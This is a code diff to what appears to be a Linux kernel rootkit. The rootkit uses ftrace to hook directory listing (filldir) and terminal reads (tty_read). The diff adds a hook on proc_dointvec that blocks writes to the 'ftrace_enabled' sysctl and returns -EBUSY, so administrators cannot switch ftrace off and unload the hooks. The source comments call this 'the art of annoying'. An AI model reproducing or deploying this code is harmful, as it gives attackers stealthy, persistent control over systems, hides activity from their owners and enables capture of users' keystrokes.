@@ -929,6 +929,28 @@ out:
     return rv;
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,8,0)
+static int (*real_proc_dointvec)(struct ctl_table *, int,
+        void __user*, size_t *, loff_t *);
+static int m_proc_dointvec(struct ctl_table *table, int write,
+        void __user *buffer, size_t *lenp, loff_t *ppos)
+#else
+static int (*real_proc_dointvec)(struct ctl_table *, int,
+        void *, size_t *, loff_t *);
+static int m_proc_dointvec(struct ctl_table *table, int write,
+        void *buffer, size_t *lenp, loff_t *ppos)
+#endif
+{
+    if (table && table->procname) {
+        if (!strcmp(table->procname, "ftrace_enabled"))
+            goto out;
+    }
+    return real_proc_dointvec(table, write, buffer, lenp, ppos);
+out:
+    /** the art of annoying */
+    return -EBUSY;
+}
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
 #define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
 #endif
@@ -1102,6 +1124,7 @@ static struct ftrace_hook ft_hooks[] = {
     {"filldir", m_filldir, &real_filldir},
     {"filldir64", m_filldir64, &real_filldir64},
     {"tty_read", m_tty_read, &real_tty_read},
+    {"proc_dointvec", m_proc_dointvec, &real_proc_dointvec},
     {NULL, NULL, NULL},
 };
 
@@ -1121,8 +1144,9 @@ int fh_install_hook(struct ftrace_hook *hook) {
     hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|
         FTRACE_OPS_FL_IPMODIFY|FTRACE_OPS_FL_PERMANENT;
 #else
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|
-        FTRACE_OPS_FL_IPMODIFY;
+    /** In older kernels we'll go via hook :( */
+  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|
+      FTRACE_OPS_FL_IPMODIFY;
 #endif
 
     if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0))) {
